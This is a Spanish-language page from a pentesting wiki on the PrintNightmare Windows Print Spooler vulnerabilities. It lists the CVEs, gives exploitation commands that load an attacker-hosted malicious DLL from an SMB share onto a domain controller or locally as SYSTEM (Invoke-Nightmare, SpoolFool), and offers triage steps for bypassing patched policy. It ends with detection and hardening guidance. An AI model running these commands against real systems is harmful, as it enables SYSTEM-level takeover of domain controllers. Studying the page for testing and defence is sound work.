# PrintNightmare (RCE/LPE del Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare es el nombre colectivo que se da a una familia de vulnerabilidades del servicio **Print Spooler** de Windows que permiten la **ejecución de código arbitrario como SYSTEM** y, cuando se puede acceder al spooler mediante RPC, la **ejecución remota de código (RCE) en controladores de dominio y servidores de archivos**. Las CVE más explotadas son **CVE-2021-1675** (clasificada inicialmente como LPE) y **CVE-2021-34527** (RCE completa). Vulnerabilidades posteriores, como **CVE-2021-34481 (“Point & Print”)** y **CVE-2022-21999 (“SpoolFool”)**, demuestran que la superficie de ataque sigue estando lejos de cerrarse.

Si buscas **forzar la autenticación / hacer relay** mediante el spooler en lugar de **RCE/LPE basada en drivers**, consulta [esta otra página sobre el abuso de la coerción de impresoras](printers-spooler-service-abuse.md). Esta página se centra en **cargar drivers / DLL como SYSTEM**.

---

## 1. Componentes vulnerables y CVE

| Año | CVE | Nombre corto | Primitiva | Notas |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corregida en la CU de junio de 2021, pero el parche se omitió mediante CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` permite a usuarios autenticados cargar un DLL de driver desde un recurso compartido remoto; después de agosto de 2021, esto suele requerir políticas de Point & Print debilitadas|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalación de drivers sin firmar por usuarios no administradores|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Creación de directorios arbitrarios → colocación de DLL; funciona después de los parches de 2021|

Todas abusan de uno de los **métodos RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) o de relaciones de confianza dentro de **Point & Print**.

## 2. Técnicas de explotación

### 2.1 Comprometer remotamente un controlador de dominio (CVE-2021-34527)

Un usuario de dominio autenticado pero **sin privilegios** puede ejecutar DLL arbitrarios como **NT AUTHORITY\SYSTEM** en un spooler remoto (a menudo el controlador de dominio) mediante:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Los PoC más conocidos incluyen **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) y los módulos `misc::printnightmare / lsa::addsid` de Benjamin Delpy en **mimikatz**.

### 2.2 Escalada local de privilegios (cualquier versión de Windows compatible, 2021-2024)

Se puede llamar a la misma API **localmente** para cargar un driver desde `C:\Windows\System32\spool\drivers\x64\3\` y obtener privilegios de SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Triaje moderno en hosts parcheados

En un host totalmente actualizado, los PoC públicos de PrintNightmare suelen fallar porque Windows ahora instala por defecto los controladores de impresora **solo para administradores** (`RestrictDriverInstallationToAdministrators=1` desde el 10 de agosto de 2021). Antes de lanzar un exploit contra un objetivo, comprueba primero si el entorno revirtió ese cambio de seguridad para implementaciones de impresoras heredadas:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Los dos valores débiles más interesantes suelen ser:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Desde Linux, confirma rápidamente que el objetivo expone las interfaces RPC de impresión pertinentes antes de ejecutar un PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Algunas herramientas públicas más recientes también ofrecen un flujo de trabajo más seguro de **verificación/listado** antes de enviar una DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Si obtienes `RPC_E_ACCESS_DENIED` (`0x8001011b`) como usuario con pocos privilegios, normalmente estás viendo el comportamiento predeterminado posterior a 2021, no un fallo de transporte.

> En Windows 11 22H2 y versiones posteriores, la impresión remota usa **RPC over TCP** de forma predeterminada, y **RPC over named pipes** (`\PIPE\spoolss`) está deshabilitado, salvo que se vuelva a habilitar explícitamente. Algunos PoC antiguos y notas de laboratorio aún dan por hecho que se puede acceder a la named pipe.<sup>[[4]](#references)</sup>

### 2.4 Abuso de Package Point & Print en redes “parcheadas”

Muchos entornos empresariales siguieron siendo **vulnerables por política** después de los parches originales de 2021, porque los flujos de trabajo de helpdesk o de servidores de impresión aún requerían que los usuarios sin privilegios de administrador instalaran o actualizaran drivers. En la práctica, el playbook ofensivo pasa a ser:

- Si los avisos de seguridad están completamente deshabilitados, **el método clásico de PrintNightmare con DLL arbitraria** sigue siendo el camino más directo.
- Si `Only use Package Point and Print` está habilitado, normalmente se necesita pivotar a una ruta con un **driver firmado compatible con paquetes**, en lugar de soltar una DLL sin más.<sup>[[3]](#references)</sup>
- Una investigación de 2024 mostró que **`Package Point and Print - Approved servers` no constituye por sí sola un límite de confianza estricto**: si un atacante puede suplantar o secuestrar la resolución de nombres de uno de los servidores de impresión aprobados, las víctimas aún pueden ser redirigidas a un servidor malicioso que cumpla las comprobaciones de la política.<sup>[[4]](#references)</sup>
- Incluso combinar el endurecimiento de UNC con RPC-over-SMB forzado puede ser poco fiable, porque los clientes modernos pueden **recurrir a RPC over TCP**.<sup>[[4]](#references)</sup>

Por eso, la explotación moderna al estilo PrintNightmare suele consistir más en **abusar de la política empresarial de despliegue de impresoras** que en repetir sin cambios el PoC original de 2021.

### 2.5 SpoolFool (CVE-2022-21999) – eludir las correcciones de 2021

Los parches de Microsoft de 2021 bloquearon la carga remota de drivers, pero **no endurecieron los permisos de directorio**. SpoolFool abusa del parámetro `SpoolDirectory` para crear un directorio arbitrario en `C:\Windows\System32\spool\drivers\`, dejar allí una DLL de payload y forzar al spooler a cargarla:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> El exploit funciona en Windows 7 → Windows 11 y Server 2012R2 → 2022 completamente actualizados antes de las actualizaciones de febrero de 2022<sup>[[2]](#references)</sup>

---

## 3. Detección y hunting

* **Registros de PrintService**: habilita el canal *Microsoft-Windows-PrintService/Operational* y busca el **Event ID 316** (controlador agregado/actualizado; suele incluir los nombres de las DLL) tanto en intentos exitosos como fallidos. Combínalo con **Event ID 808/811** para detectar errores sospechosos al cargar módulos/controladores del spooler.
* **Sysmon**: `Event ID 7` (imagen cargada) o `11/23` (escritura/eliminación de archivos) dentro de `C:\Windows\System32\spool\drivers\*` cuando el proceso padre sea **spoolsv.exe**.
* **Linaje de procesos**: genera una alerta cada vez que **spoolsv.exe** inicie `cmd.exe`, `rundll32.exe`, PowerShell o cualquier proceso secundario inesperado y sin firmar.
* **Telemetría de red**: las conexiones SMB inesperadas de **spoolsv.exe** a recursos compartidos controlados por un atacante o el tráfico RPC de impresora inusual desde servidores que no deberían funcionar como servidores de impresión son indicios de alto valor.

## 4. Mitigación y hardening

1. **¡Aplica los parches!**: instala la última actualización acumulativa en todos los hosts Windows que tengan instalado el servicio Print Spooler.
2. **Deshabilita el spooler donde no sea necesario**, especialmente en los controladores de dominio:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Bloquea las conexiones remotas** y permite la impresión local: Directiva de grupo: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Mantén Point & Print solo para administradores** configurando:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Guía detallada en Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Si los requisitos del negocio obligan a establecer `RestrictDriverInstallationToAdministrators=0`, considera cualquier otra política de impresoras únicamente una **mitigación parcial**. Como mínimo, prefiere **package-aware drivers**, habilita **Only use Package Point and Print** y limita **Package Point and Print - Approved servers** a servidores de impresión explícitos del bosque.<sup>[[3]](#references)</sup>
6. **No reviertas la privacidad de RPC de impresoras** solo para solucionar las asignaciones de impresoras que no funcionan. Los entornos que establecen `RpcAuthnLevelPrivacyEnabled=0` están deshaciendo las medidas de hardening añadidas para **CVE-2021-1678** y, por lo general, merecen un escrutinio adicional durante una evaluación.<sup>[[4]](#references)</sup>

---

## 5. Investigación y herramientas relacionadas

* Módulos de [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare): implementación estándar de Impacket con modos `-check`, `-list` y `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527): wrapper con entrega SMB integrada, compatibilidad con varios objetivos y modos `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position): abuso de un controlador de impresora vulnerable propio mediante package Point & Print
* Exploit y write-up de SpoolFool
* Micropatches de 0patch para SpoolFool y otros errores del spooler

Si quieres **forzar la autenticación** mediante el spooler en lugar de cargar un controlador, ve a [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Administrar el nuevo comportamiento predeterminado de instalación de controladores de Point and Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Guía práctica de PrintNightmare en 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare aún no ha terminado](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
